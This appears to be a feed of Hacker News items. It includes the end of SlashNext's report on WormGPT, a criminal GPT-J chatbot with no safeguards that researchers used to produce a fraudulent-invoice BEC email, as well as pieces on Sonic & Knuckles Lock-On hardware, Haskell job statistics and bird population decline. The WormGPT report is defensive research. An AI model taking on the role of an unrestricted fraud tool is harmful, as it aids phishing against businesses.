<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT.png" alt="WormGPT" width="936" height="476" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-300x153.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-768x391.png 768w" sizes="(max-width: 936px) 100vw, 936px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20476'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-300x153.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-768x391.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT.png"></p>
<p>Finally, in the third image above, we see that malicious actors are now creating their own custom modules similar to ChatGPT, but easier to use for nefarious purposes. Not only are they creating these custom modules, but they are also advertising them to fellow bad actors. This shows how cybersecurity is becoming more challenging due to the increasing complexity and adaptability of these activities in a world shaped by AI.</p>
<h2><strong>Uncovering WormGPT: A Cybercriminal’s Arsenal</strong></h2>
<p>Our team recently gained access to a tool known as “WormGPT” through a prominent online forum that’s often associated with cybercrime. This tool presents itself as a blackhat alternative to GPT models, designed specifically for malicious activities.</p>
<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Screen.png" alt="WormGPT Screen" width="936" height="432" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Screen.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Screen-300x138.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Screen-768x354.png 768w" sizes="(max-width: 936px) 100vw, 936px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20432'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Screen.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Screen-300x138.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Screen-768x354.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Screen.png"></p>
<p>WormGPT is an AI module based on the GPTJ language model, which was developed in 2021. It boasts a range of features, including unlimited character support, chat memory retention, and code formatting capabilities.</p>
<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Data-Sourc.png" alt="WormGPT Data Source" width="938" height="372" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Data-Sourc.png 938w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Data-Sourc-300x119.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Data-Sourc-768x305.png 768w" sizes="(max-width: 938px) 100vw, 938px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20938%20372'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Data-Sourc.png 938w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Data-Sourc-300x119.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Data-Sourc-768x305.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Data-Sourc.png"></p>
<p>As depicted above, WormGPT was allegedly trained on a diverse array of data sources, particularly concentrating on malware-related data. However, the specific datasets utilised during the training process remain confidential, as decided by the tool’s author.</p>
<p><img decoding="async" src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Created-BEC-Attack.png" alt="WormGPT Created BEC Attack" width="936" height="392" srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Created-BEC-Attack.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Created-BEC-Attack-300x126.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Created-BEC-Attack-768x322.png 768w" sizes="(max-width: 936px) 100vw, 936px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20392'%3E%3C/svg%3E" data-lazy-srcset="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Created-BEC-Attack.png 936w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Created-BEC-Attack-300x126.png 300w, https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Created-BEC-Attack-768x322.png 768w" data-lazy-src="https://i0.wp.com/slashnext.com/wp-content/uploads/2023/07/WormGPT-Created-BEC-Attack.png"></p>
<p>As you can see in the screenshot above, we conducted tests focusing on BEC attacks to comprehensively assess the potential dangers associated with WormGPT. In one experiment, we instructed WormGPT to generate an email intended to pressure an unsuspecting account manager into paying a fraudulent invoice.</p>
<p>The results were unsettling. WormGPT produced an email that was not only remarkably persuasive but also strategically cunning, showcasing its potential for sophisticated phishing and BEC attacks.</p>
<p>In summary, it’s similar to ChatGPT but has no ethical boundaries or limitations. This experiment underscores the significant threat posed by generative AI technologies like WormGPT, even in the hands of novice cybercriminals.</p>
<h2><strong>Benefits of Using Generative AI for BEC Attacks</strong></h2>
<p>So, what specific advantages does using generative AI confer for BEC attacks?</p>
<p><strong>Exceptional Grammar:</strong> Generative AI can create emails with impeccable grammar, making them seem legitimate and reducing the likelihood of being flagged as suspicious.</p>
<p><strong>Lowered Entry Threshold:</strong> The use of generative AI democratises the execution of sophisticated BEC attacks. Even attackers with limited skills can use this technology, making it an accessible tool for a broader spectrum of cybercriminals.</p>
<h2><strong>Ways of Safeguarding Against AI-Driven BEC Attacks</strong></h2>
<p>In conclusion, the growth of AI, while beneficial, brings progressive, new attack vectors. Implementing strong preventative measures is crucial. Here are some strategies you can employ:</p>
<p><strong>BEC-Specific Training:</strong> Companies should develop extensive, regularly updated training programs aimed at countering BEC attacks, especially those enhanced by AI. Such programs should educate employees on the nature of BEC threats, how AI is used to augment them, and the tactics employed by attackers. This training should also be incorporated as a continuous aspect of employee professional development.</p>
<p><strong>Enhanced Email Verification Measures:</strong> To fortify against AI-driven BEC attacks, organisations should enforce stringent email verification processes. These include implementing systems that automatically alert when emails originating outside the organisation impersonate internal executives or vendors, and using email systems that flag messages containing specific keywords linked to BEC attacks like “urgent”, “sensitive”, or “wire transfer”. Such measures ensure that potentially malicious emails are subjected to thorough examination before any action is taken.</p>
<h2><strong>Test Your Security Efficacy in Observability Mode</strong></h2>
<p>To see a personalised demo and learn how our product stops BEC, <a href="https://www.slashnext.com/request-a-demo/">click here</a> or easily test the efficacy of your current email security with no impact to your existing email infrastructure using our 5-min setup <a href="https://www.slashnext.com/email-threat-observability/">Observability Mode</a>.</p>
<p><strong>About the Author</strong></p>
<p>Daniel Kelley is a reformed black hat computer hacker who collaborated with our team at SlashNext to research the latest threats and tactics employed by cybercriminals, particularly those involving BEC, phishing, smishing, social engineering, ransomware, and other attacks that exploit the human element.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How does Sonic and Knuckles' “Lock-On Technology” work? (2016) (177 pts)]]></title>
            <link>https://retrocomputing.stackexchange.com/questions/1514/how-exactly-does-sonic-knuckles-lock-on-technology-work</link>
            <guid>36742444</guid>
            <pubDate>Sun, 16 Jul 2023 01:02:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://retrocomputing.stackexchange.com/questions/1514/how-exactly-does-sonic-knuckles-lock-on-technology-work">https://retrocomputing.stackexchange.com/questions/1514/how-exactly-does-sonic-knuckles-lock-on-technology-work</a>, See on <a href="https://news.ycombinator.com/item?id=36742444">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="text">
<blockquote>
<p>How does the Sonic &amp; Knuckles cart detect another cartridge?</p>
</blockquote>
<p>It checks the serial numbers of games; they can be found in the ROM's header. It probably detects all preceding Sonic the Hedgehog games since they all result in specific effects when locked-on.</p>
<blockquote>
<p>Are the game ROMs merged in some way when connected?</p>
</blockquote>
<p>It seems both games are simply mapped onto memory. This way, the executing game code gets access to the contents of both games.</p>
<p>To better understand what this means, imagine a Sonic &amp; Knuckles ROM with the complete contents of the Sonic the Hedgehog 3 ROM concatenated onto it.</p>
<p><img src="https://docs.google.com/drawings/d/1bYEZHBCZCIMGC-uvZuWg4jOaeyv7ZETZQe9PU88uJno/pub?w=1137&amp;h=573" alt="Sonic &amp; Knuckles and Sonic the Hedgehog 3"></p>
<p>The address space represents memory the game code can access. The contents of the <a href="https://en.wikipedia.org/wiki/Read-only_memory" rel="noreferrer">read-only memory</a> chips get <em>mapped</em> onto the Mega Drive's 68k processor's 24-bit address space. The Mega Drive just sees two games, one after another. Incidentally, that's what a good dump of Sonic 3 &amp; Knuckles looks like. This explains why the game works even in emulators that don't support any of the custom hardware inside the Sonic &amp; Knuckles cartridge.</p>
<p>Any game locked onto Sonic &amp; Knuckles will probably have its ROM mapped onto the game's address space the same way. This means game's data is <em>made available</em> for use by the Sonic &amp; Knuckles game code; it does <em>not</em> necessarily mean the data will be <em>used</em>. Since Sonic &amp; Knuckles was programmed to work with Sonic the Hedgehog 3, it makes extensive use of the data in the locked-on cartridge. Its handling of other games is far less sophisticated; apparently, it just uses the metadata found in the ROM's header to generate a unique Blue Spheres stage. If it detects that it's the first Sonic the Hedgehog game, it simply unlocks the full version of the bonus game.</p>
<p>The connection to Sonic the Hedgehog 2 works similarly:</p>
<p><img src="https://docs.google.com/drawings/d/e/2PACX-1vQeNKgjPpKN-m24msxznacQ-BTYkJQB62DQD0yopX6N0D0fO7CpZQstL5maNbfuASLW5TG8wtDWhMoy/pub?w=1137&amp;h=573" alt="Sonic &amp; Knuckles and Sonic the Hedgehog 3"></p>
<p>There are two ROM chips in the Sonic &amp; Knuckles cartridge: one has the main game and the other has a patch for Sonic the Hedgehog 2. The patch ROM contains the complete Knuckles the Echidna in Sonic the Hedgehog 2 game code; this is the full code for the original game but modified with the necessary game mechanics for Knuckles: lower speed, lower jump height, flight, wall climbing, etc. The ROM also contains new graphics data for Knuckles as well as new map data with places and items for Knuckles to reach with his abilities.</p>
<p>When Sonic &amp; Knuckles detects that Sonic the Hedgehog 2 is locked on, it passes control of the processor to the code inside the patch ROM, thereby launching Knuckles the Echidna in Sonic the Hedgehog 2. The new game can reuse much of the data from the original game: level graphics, enemy data, bosses, etc. The only code from the locked-on cartridge that executes is the sound driver.</p>
<blockquote>
<p>My question is, <strong>how</strong> exactly does the Lock-On Technology work?</p>
</blockquote>
<p>Let's delve into the details.</p>
<p>According to <a href="http://www.emulationzone.org/projects/s&amp;k/references.htm" rel="noreferrer">Lock-on Technology Hacking Guide</a>, there are some chips on the Sonic &amp; Knuckles cartridge:</p>
<ul>
<li><a href="http://i2c2p.twibright.com/datasheet/74HC_HCT74_3.pdf" rel="noreferrer">74HC74 Dual D-type Flip-Flop</a></li>
<li><a href="http://www.solarbotics.net/library/datasheets/74AC139.pdf" rel="noreferrer">74AC139 1-of-4 decoder/demultiplexer</a></li>
<li><a href="https://www.fairchildsemi.com/datasheets/74/74AC08.pdf" rel="noreferrer">74AC08 Quad 2-input AND Gate</a></li>
</ul>
<p>Along with the two ROM chips and the cartridge slot, they implement the Lock-On functionality.</p>
<p>Rizzo's photographs show what the cartridge's printed circuit board looks like:</p>
<p><a href="https://i.stack.imgur.com/fFdzL.jpg" rel="noreferrer"><img src="https://i.stack.imgur.com/fFdzL.jpg" alt="Sonic &amp; Knuckles cartridge printed circuit board, front"></a>
<a href="https://i.stack.imgur.com/Z7wso.jpg" rel="noreferrer"><img src="https://i.stack.imgur.com/Z7wso.jpg" alt="Sonic &amp; Knuckles cartridge printed circuit board, front"></a></p>
<p>The Mega Drive's cartridge I/O is meant for only one cartridge. However, a cartridge locked onto Sonic &amp; Knuckles forms a system that contains three ROM chips:</p>
<ul>
<li>Sonic &amp; Knuckles cartridge
<ul>
<li>Sonic &amp; Knuckles ROM <sub>2 MB</sub></li>
<li>Sonic the Hedgehog 2 patch ROM <sub>512 kB</sub>
<ul>
<li>Responsible for <a href="http://info.sonicretro.org/Knuckles_the_Echidna_in_Sonic_the_Hedgehog_2" rel="noreferrer">Knuckles the Echidna in Sonic the Hedgehog 2</a></li>
</ul>
</li>
</ul>
</li>
<li>Locked-on cartridge
<ul>
<li>Game ROM</li>
</ul>
</li>
</ul>
<p>Apparently, the key functionality behind Lock-On Technology is choosing one of those ROM chips and connecting it to the appropriate addressing lines of the Mega Drive which is none the wiser.</p>
<p>This memory bank switching is apparently achieved via the chip enable lines. They are active when logically <code>0</code> and if inactive will cause all memory addressing operations to be ignored and nothing to be returned on the data bus, effectively "disabling" the chip. If one of the ROMs is disabled, the other will be mapped in its place. The Mega Drive just sees a big cartridge with a big address space.</p>
<p>Rizzo also made a schematic of the electronics:</p>
<p><a href="https://i.stack.imgur.com/ESaiS.gif" rel="noreferrer"><img src="https://i.stack.imgur.com/ESaiS.gif" alt="Sonic &amp; Knuckles Lock-On schematics, full"></a></p>
<p>Even though I'm not an electronics expert, I was able to figure some things out by studying the schematics and reading the notes on the website. Here's what I learned.</p>
<h2>The 74HC74 Flip-Flop</h2>
<p>The purpose of this chip is to hold a single bit of information: is Sonic the Hedgehog 2 locked on? Much of the circuit's operation depends on this single bit. It is denoted by the red node on the schematic, corresponding to the 74HC74's <code>Q</code> output.</p>
<p>When Sonic &amp; Knuckles boots, it checks its cartridge slot. If there is a game locked on, it tests if its serial number matches that of earlier Sonic games. If it detects Sonic the Hedgehog 2, a signal is generated on the ROM's <code>D0</code> line, setting the <code>Q</code> bit of the 74HC74.</p>
<h2>The 74AC139 decoder/demultiplexer</h2>
<p>There are two independent decoders <code>M</code> and <code>N</code>, each with three inputs <code>E̅</code>, <code>SA</code> and <code>SB</code> as well as four outputs <code>Y0</code>, <code>Y1</code>, <code>Y2</code> and <code>Y3</code>. If <code>E̅</code> is <code>1</code>, all outputs are also forced to <code>1</code>.</p>
<p>The <code>Y</code> outputs obey the following truth table:</p>
<pre><code>E̅ SA SB Y0 Y1 Y2 Y3
1 -- --  1  1  1  1
0  0  0  0  1  1  1
0  1  0  1  0  1  1
0  0  1  1  1  0  1
0  1  1  1  1  1  0
</code></pre>
<h3>The I/O arrangement of each decoder</h3>
<p><code>M</code> is connected to to address line 20 and the output of the 74HC74 through <code>SA</code> and <code>SB</code> respectively; <code>E̅</code> is connected to the <code>Y3</code> output of <code>N</code>. The chip enable line of the Sonic the Hedgehog 2 patch ROM is connected to <code>Y3</code>, while <code>Y0</code>, <code>Y1</code> and <code>Y2</code> are all inputs to the 74AC08.</p>
<p><code>N</code> is connected to address line 21 through both <code>SA</code> and <code>SB</code>. The chip enable signal from Mega Drive is connected to <code>E̅</code>. The chip enable line of the Sonic &amp; Knuckles ROM is connected to <code>Y0</code> but <code>Y1</code> and <code>Y2</code> are not connected to anything at all. <code>Y3</code> is connected to <code>M</code>'s <code>E̅</code> input.</p>
<h3>Putting it all together</h3>
<p>Decoder <code>M</code> controls the activation of both the Sonic the Hedgehog 2 patch ROM and the locked-on cartridge's ROM. Decoder <code>N</code> controls the activation of the Sonic &amp; Knuckles ROM.</p>
<p>The A21 line addresses memory that is beyond the bounds of the game's 2 megabytes ROM. If this memory is accessed, the result is that the Sonic &amp; Knuckles ROM is disabled. Otherwise, it is enabled and <code>M</code>'s <code>E̅</code> is set.</p>
<p>The A20 line addresses memory that is within bounds; if that memory is accessed and the 74HC74 is also set, the Sonic the Hedgehog 2 patch ROM is enabled and the outputs to the 74AC08 are all <code>1</code>. If <code>M</code>'s <code>E̅</code> is set, the 74AC08 also receives all <code>1</code>s, but the patch ROM is not enabled.</p>
<h2>The 74AC08 AND Gates</h2>
<p>The 74AC08 has three inputs <code>Y0</code>, <code>Y1</code> and <code>Y2</code> as well as a single output that equals <code>Y0 ∧ Y1 ∧ Y2</code> and is connected to the locked-on cartridge's chip enable line. Therefore, the second cartridge's ROM will only be mapped when all its inputs are <code>1</code>:</p>
<ul>
<li>Locked-on cartridge is Sonic the Hedgehog 2</li>
<li>Sonic &amp; Knuckles ROM is enabled
<ul>
<li><code>M</code>'s <code>E̅</code> is set</li>
</ul>
</li>
</ul>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New study gives clues on why exercise helps with inflammation (138 pts)]]></title>
            <link>https://www.sciencedaily.com/releases/2023/06/230615183114.htm</link>
            <guid>36742428</guid>
            <pubDate>Sun, 16 Jul 2023 01:00:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sciencedaily.com/releases/2023/06/230615183114.htm">https://www.sciencedaily.com/releases/2023/06/230615183114.htm</a>, See on <a href="https://news.ycombinator.com/item?id=36742428">Hacker News</a></p>
Couldn't get https://www.sciencedaily.com/releases/2023/06/230615183114.htm: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[The Haskell job market has been growing steaily since 2008 (113 pts)]]></title>
            <link>https://github.com/nh2/haskell-jobs-statistics</link>
            <guid>36742311</guid>
            <pubDate>Sun, 16 Jul 2023 00:43:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/nh2/haskell-jobs-statistics">https://github.com/nh2/haskell-jobs-statistics</a>, See on <a href="https://news.ycombinator.com/item?id=36742311">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">haskell-jobs-statistics</h2>
<p dir="auto">This repo collects analyses of the Haskell jobs market.</p>
<p dir="auto">Summary: <strong>The Haskell job market has been growing steadily since 2008.</strong></p>
<h2 tabindex="-1" dir="auto">Reddit <code>/r/haskell</code></h2>
<p dir="auto">In 2023-01-12 I gave a beginner talk at the Zurich <a href="https://zfoh.ch/" rel="nofollow">HaskellerZ</a> meetup, teaching how to use the Reddit API (<a href="https://github.com/nh2/haskell-reddit-jobs-counter">code</a>).</p>
<p dir="auto">From this, I compiled and manually verified a Google Sheet (<a href="https://docs.google.com/spreadsheets/d/1X8MDuYRcrTiYjdzq24aOhloo9tTwL0gqGWWYggvcW3s/edit?usp=sharing" rel="nofollow">link</a>) to create the following graphs:</p>
<h3 tabindex="-1" dir="auto">Cumulative Haskell Reddit job postings over time (2008-2022)</h3>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/nh2/haskell-jobs-statistics/blob/master/charts/reddit-haskell-2008-to-2022-cumulative.png"><img src="https://github.com/nh2/haskell-jobs-statistics/raw/master/charts/reddit-haskell-2008-to-2022-cumulative.png" alt="reddit haskell 2008 to 2022 cumulative"></a></p>
<h3 tabindex="-1" dir="auto">Bucketed per year</h3>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/nh2/haskell-jobs-statistics/blob/master/charts/reddit-haskell-2008-to-2022-bucketed.svg"><img src="https://github.com/nh2/haskell-jobs-statistics/raw/master/charts/reddit-haskell-2008-to-2022-bucketed.svg" alt="reddit haskell 2008 to 2022 bucketed"></a></p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A Third of North America’s Birds Have Vanished (486 pts)]]></title>
            <link>https://nautil.us/a-third-of-north-americas-birds-have-vanished-340007/</link>
            <guid>36741910</guid>
            <pubDate>Sat, 15 Jul 2023 23:33:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nautil.us/a-third-of-north-americas-birds-have-vanished-340007/">https://nautil.us/a-third-of-north-americas-birds-have-vanished-340007/</a>, See on <a href="https://news.ycombinator.com/item?id=36741910">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
              <!-- collection-box -->
              <p><span>F</span>or weeks, Adam Smith had been crunching the raw data from more bird statistics than anyone had ever tried before—thirteen different bird counts and millions of radar sweeps. Suddenly he heard the musical chime that tells him his results are ready. He leaned across his desk, surrounded by enough high-powered computers to heat up his entire office, and stared at what could only be an impossible conclusion: Over the past fifty years, his calculations found, a third of North America’s birds had vanished. “Well, that can’t be right,” he thought. “I must have made a mistake somewhere.”</p><p>Smith, one of the hemisphere’s top specialists in bird populations, just sat for a while in his cluttered cubicle at the Canadian Wildlife Service, which was decorated with caribou antlers, a musk-ox skull, and early drawings from his twin boys. Then it dawned on him. “This would be a massive change, an absolutely profound change in the natural system,” he said. “And we weren’t even aware of it.”</p><figure><img decoding="async" width="800" height="410" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-4.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-4.png?q=65&amp;auto=format&amp;w=1600 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-4.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-4.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>GLOBE TROTTER:</strong> Teams of researchers in both South and North America are trying to protect the Cerulean Warbler, one of scores of tiny world-travelers whose ranges span the hemisphere. <em>Photo by Anders Gyllenhaal.</em></figcaption></figure><p>Up until that point, counting the abundance of individual birds throughout the entire continent was impossible. At any given time, many species number in the tens of millions in North America—adding up to billions of birds—and they’re constantly on the move. But the science of bird study was advancing, and a close-knit group of scientists was experimenting with using radar imagery, satellite photos, and citizen science to add precision to the dozens of conventional bird counts done for groups of species.</p><figure><img decoding="async" width="800" height="568" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/wib37u31-Gyllenhaal_BREAKER-8.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/wib37u31-Gyllenhaal_BREAKER-8.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 800w,https://assets.nautil.us/sites/3/nautilus/wib37u31-Gyllenhaal_BREAKER-8.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/wib37u31-Gyllenhaal_BREAKER-8.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>CITIZEN SCIENCE:</strong> The Great Blue Heron, shown here with its decorous mating plumage, is one of the species most often reported by birders as part of the massive citizen science project powered by the eBird smartphone app. Photo by <em>Anders Gyllenhaal.</em></figcaption></figure><p>The computation Smith had just finished that day in May 2019 combined individual population estimates for 529 bird species, from the most common sparrows and robins to rarities hardly ever seen. When Smith pulled these estimates together and adjusted each for its degree of certainty, the findings came down to a single ski slope of a chart. It showed a precipitous drop in nearly all these species in every part of the continent. At the bottom sat four lone digits—2.913. That’s the number of breeding birds in billions that had disappeared since the early 1970s. He had documented an accelerating churn of seasonal losses that slowly took their toll on the abundance of birds. And it translated to an astounding third of the adult birds that not long ago filled North America but now are gone.</p><figure><img decoding="async" width="800" height="800" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>BYE, BIRDS: </strong>The graphic that Adam Smith sent out to his fellow scientists, showing the seismic drop in bird populations over the past fifty years.&nbsp; <em>Credit: Adam Smith.</em></figcaption></figure><div><p>The hardest hit were grassland birds, down by more than 50 percent, mostly due to the expansion of farms that turn a varied landscape into acres of neat, plowed rows. That equates to 750 million birds, from bright yellow Eastern and Western Meadowlarks with their incessant morning songs to the stately Horned Lark with black masks across the male’s eyes and tiny hornlike feathers that sometimes stick up from their heads. Forest birds lost a third of their numbers, or 500 million, including the compact, colorful warblers and speckle-breasted Wood Thrushes that sing like flutes. Common backyard birds experienced a seismic decline. That’s where 90 percent of the total loss of abundance occurred, among just twelve families of the best-known birds—including sparrows, blackbirds, starlings, and finches. There’s been relatively little research on these species, and there’s no sense of urgency when resources are already stretched thin for so many other birds in more dire need.</p><p>The possibility of such losses was too startling to share with his colleagues until Smith checked every step of his calculations, particularly since he’d never attempted this <a href="https://par.nsf.gov/servlets/purl/10133018">analysis before</a>. “It always takes a couple of times to get these numbers right,” he said. After a day and a half of painstaking scrutiny, Smith realized there was no mistake. “I was speechless. We’ve lost almost 30 percent of an entire class of organisms in less than the span of a human lifetime, and we didn’t know it.”</p></div>
          <figure><img decoding="async" width="800" height="608" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-2.png?auto=compress&amp;fit=scale&amp;fm=png&amp;h=778&amp;ixlib=php-3.3.1&amp;w=1024&amp;wpsize=large" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-2.png?q=65&amp;auto=format&amp;w=1600 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-2.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-2.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>SUCCESS STORY: </strong>The Bald Eagle is North America’s great conservation success story, more than quadrupling its population in the past decade under an all-out effort to protect the iconic raptor. <em>Photo by Anders Gyllenhaal.</em></figcaption></figure><figure><img decoding="async" width="800" height="736" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-6.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-6.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-6.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-6.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>SOUND ON:</strong> The California Spottled Owl is at the center of the world’s largest research project that uses sound to determine how to protect this storied species.<em> Photo by Anders Gyllenhaal.</em></figcaption></figure><figure><img decoding="async" width="800" height="410" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-5.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-5.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-5.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-5.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>HUM HALLELUJAH:</strong> The Ruby-throated hummingbird delivers one of the core services that birds provide in the balance of nature. Hummingbirds alone help pollinate more than 8,000 species of plants and flowers in North and South America. <em>Photo by Anders Gyllenhaal.</em></figcaption></figure><figure><img decoding="async" width="800" height="432" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-3.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-3.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-3.png?q=65&amp;auto=format&amp;w=1200 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-3.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"><figcaption><strong>FOLLOW THE BIRD:</strong> Scientists hope to save the Florida Scrub-Jay, the state’s lone native bird, with the help of a new tracking technique that follows the birds wherever they go around the clock. <em>Photo by Jay Gyllenhaal.</em></figcaption></figure><p><em>From</em> A Wing and a Prayer: The Race to Save Our Vanishing Birds <em>by Anders Gyllenhaal and Beverly Gyllenhaal. Copyright © 2023 by Anders Gyllenhaal and Beverly Gyllenhaal. Reprinted by permission of Simon &amp; Schuster, Inc.</em></p><p><em>Lead image: Bonnie Taylor Barry / Shutterstock</em></p><figure><img decoding="async" width="800" height="244" alt="In Body Image" src="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-8.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1" srcset="https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-8.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 800w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-8.png?auto=compress&amp;fm=png&amp;ixlib=php-3.3.1 600w,https://assets.nautil.us/sites/3/nautilus/Gyllenhaal_BREAKER-8.png?q=65&amp;auto=format&amp;w=800 400w" loading="lazy"></figure>

            
                            <ul>
                      <li>
              <div>
              <h6>Anders Gyllenhaal</h6>
              <p>Posted on June 30, 2023</p>
              </div>
